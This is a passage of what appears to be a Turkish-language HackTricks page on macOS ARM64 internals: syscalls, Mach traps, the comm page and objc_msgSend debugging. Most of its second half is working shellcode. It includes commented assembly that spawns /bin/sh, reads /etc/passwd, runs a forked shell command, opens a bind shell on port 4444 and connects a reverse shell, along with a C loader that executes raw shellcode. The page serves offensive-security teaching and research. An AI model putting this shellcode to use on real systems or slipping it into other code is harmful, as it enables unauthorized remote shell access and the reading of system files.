- **`AIF`**: Bazı exception'lar **`A`**, `I`, `F` bit'leri kullanılarak devre dışı bırakılabilir. **`A`** 1 ise **asynchronous aborts** tetiklenir. **`I`**, harici donanım **Interrupt Requests**'lerine (IRQ'lar) yanıt verilmesini yapılandırır. `F` ise **Fast Interrupt Requests** (FIR'lar) ile ilgilidir.

## macOS

### BSD syscalls

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) dosyasına göz atın veya `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h` komutunu çalıştırın. BSD syscalls için **x16 > 0** olacaktır.

### Mach Traps

[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) içinde `mach_trap_table`'a ve [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) içinde prototype'lara göz atın. Mach trap'lerinin max sayısı `MACH_TRAP_TABLE_COUNT` = 128'dir. Mach trap'lerinde **x16 < 0** olur; bu nedenle önceki listedeki sayıları **eksi** işaretiyle çağırmanız gerekir: **`_kernelrpc_mach_vm_allocate_trap`**, **`-10`** değerindedir.

Bu ve BSD syscalls'lerini nasıl çağıracağınızı görmek için bir disassembler'da **`libsystem_kernel.dylib`** dosyasını da inceleyebilirsiniz:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** ve **Ghidra**, yalnızca cache'i geçirerek cache'ten **specific dylibs** dosyalarını da decompile edebilir.

> [!TIP]
> Bazen **`libsystem_kernel.dylib`** dosyasındaki **decompiled** kodu kontrol etmek, **source code** kontrol etmekten **daha kolaydır**; çünkü bazı syscall'ların (BSD ve Mach) kodu script'ler aracılığıyla oluşturulur (source code içindeki yorumları kontrol edin), dylib içinde ise neyin çağrıldığını görebilirsiniz.

### machdep calls

XNU, machine dependent olarak adlandırılan başka bir call türünü de destekler. Bu call'ların numaraları architecture'a bağlıdır ve ne call'ların ne de numaralarının sabit kalacağı garanti edilir.

### comm page

Bu, kernel tarafından sahip olunan ve her user process'in address space'ine map edilen bir memory page'dir. Kernel service'leri için user mode'dan kernel space'e geçişi, bu geçişin çok verimsiz olacağı kadar sık kullanılan syscall'ları kullanmaktan daha hızlı hâle getirmek amacıyla tasarlanmıştır.

Örneğin `gettimeofdate` call'ı, `timeval` değerini doğrudan comm page'den okur.

### objc_msgSend

Bu function'ı Objective-C veya Swift programlarında kullanılmış olarak görmek oldukça yaygındır. Bu function, bir Objective-C object'inin method'unu çağırmayı sağlar.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Instance'a pointer
- x1: op -> Method'un selector'ı
- x2... -> Invoked method'un diğer arguments'ları

Dolayısıyla, bu function'a branch işleminden önce breakpoint koyarsanız, aşağıdaki komutla lldb içinde neyin invoke edildiğini kolayca bulabilirsiniz (bu örnekte object, bir command çalıştıracak olan `NSConcreteTask` içindeki bir object'i çağırır):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Env variable **`NSObjCMessageLoggingEnabled=1`** ayarlanarak, bu function'ın çağrıldığı zamanı `/tmp/msgSends-pid` gibi bir file'a loglamak mümkündür.
>
> Ayrıca **`OBJC_HELP=1`** ayarlanıp herhangi bir binary çağrıldığında, belirli Objc-C action'ları gerçekleştiğinde **log** almak için kullanabileceğiniz diğer environment variable'ları görebilirsiniz.

Bu function çağrıldığında, belirtilen instance'ın çağrılan method'unu bulmak gerekir; bunun için farklı aramalar yapılır:

- Optimistic cache lookup gerçekleştirilir:
- Başarılıysa işlem tamamlanır
- runtimeLock (read) alınır
- (`realize && !cls->realized`) ise class realize edilir
- (`initialize && !cls->initialized`) ise class initialize edilir
- Class'ın kendi cache'i denenir:
- Başarılıysa işlem tamamlanır
- Class method listesi denenir:
- Bulunursa cache doldurulur ve işlem tamamlanır
- Superclass cache'i denenir:
- Başarılıysa işlem tamamlanır
- Superclass method listesi denenir:
- Bulunursa cache doldurulur ve işlem tamamlanır
- (`resolver`) ise method resolver denenir ve class lookup'tan itibaren tekrarlanır
- Hâlâ buradaysa (= diğer tüm seçenekler başarısız olduysa) forwarder denenir

### Shellcodes

Derlemek için:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Byte'ları çıkarmak için:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Daha yeni macOS sürümleri için:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>shellcode'u test etmek için C kodu</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**Buradan**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) alınmış ve açıklanmıştır.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### cat ile oku

Amaç `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` çalıştırmaktır; bu nedenle ikinci argüman (x1), bir parametre dizisidir (bellekte bu, adreslerden oluşan bir stack anlamına gelir).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Ana işlemin sonlandırılmaması için fork'tan sh ile komut çağırma
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

[https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) kaynağındaki **port 4444** üzerindeki Bind shell<sup>[[2]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

[https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s) adresinden, **127.0.0.1:4444** adresine revshell<sup>[[3]](#references)</sup>
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## Referanslar

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)

{{#include ../../../banners/hacktricks-training.md}}
